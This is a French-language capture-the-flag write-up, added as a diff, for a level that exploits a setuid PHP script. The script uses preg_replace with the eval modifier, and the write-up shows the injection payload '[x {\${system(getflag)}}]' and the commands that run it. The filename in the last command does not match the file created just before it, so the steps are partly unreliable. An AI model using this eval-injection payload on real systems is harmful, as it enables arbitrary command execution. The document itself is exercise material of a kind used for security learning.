@@ -1,0 +1,46 @@
+cat level06.php :
+#!/usr/bin/php
+<?php
+function y($m) { 
+    $m = preg_replace("/\./", " x ", $m); 
+    $m = preg_replace("/@/", " y", $m); return $m; 
+}
+function x($y, $z) { 
+    $a = file_get_contents($y); 
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+    $a = preg_replace("/\[/", "(", $a); 
+    $a = preg_replace("/\]/", ")", $a); 
+    return $a; 
+}
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+
+le fichier level06 a la permission s = setuid (flag06)
+cat level06 -> execute le fichier level06.php
+cat level06.php
+> #!/usr/bin/php
+> <?php
+> function y($m) { 
+>     $m = preg_replace("/\./", " x ", $m); 
+>     $m = preg_replace("/@/", " y", $m); return $m; 
+> }
+> function x($y, $z) { 
+>    $a = file_get_contents($y); 
+>    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+>    $a = preg_replace("/\[/", "(", $a); 
+>    $a = preg_replace("/\]/", ")", $a); 
+>    return $a; 
+> }
+> $r = x($argv[1], $argv[2]); print $r;
+> ?>
+
+le programme level06 exécute la fonction x avec 2 arguments, le premier argument est un fichier
+dans la fonction x : lit le fichier en argument et avec le preg_replace remplace en fonction des regex indiquées.
+la regex "/(\[x (.*)\])/e" utilise l'option e qui évalue le texte comme le résultat du code php a exécuter. 
+Si on retrace toutes les regex qui éliminent des caractères dans la source, 
+pour executer getflag avec la commande system de php, on devra ecrire : [x {\${system(getflag)}}]
+
+echo "[x {\${system(getflag)}}]" > /tmp/fichierquidoitcontenirleflag
+
+./level06 /tmp/fichierquicontenirleflag
